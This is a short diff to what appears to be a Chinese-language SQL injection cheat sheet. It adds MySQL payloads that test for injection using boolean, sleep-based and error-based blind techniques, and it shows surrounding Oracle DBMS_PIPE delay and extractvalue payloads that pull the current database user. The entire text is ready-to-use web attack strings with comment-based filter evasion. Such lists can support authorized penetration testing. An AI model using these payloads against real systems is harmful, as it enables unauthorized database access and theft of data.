@@ -383,6 +383,14 @@ asbbs')and+ 1=(DBMS_PIPE.RECEIVE_MESSAGE('a',10))/*
 
 #### mysql报错注入
 
+- 判断是否存在注入
+```
+1/**/AND/**/1=2
+(select*from(select+sleep(2)union/**/select+0)a)
+(select/**/1=if(ascii(substr((select/**/user()),1,1))=104,1,exp(1000)))
+
+```
+
 - 获取当前数据库用户
 ```
 1' and extractvalue(1,concat(0x7e,(select user()),0x7e))--+
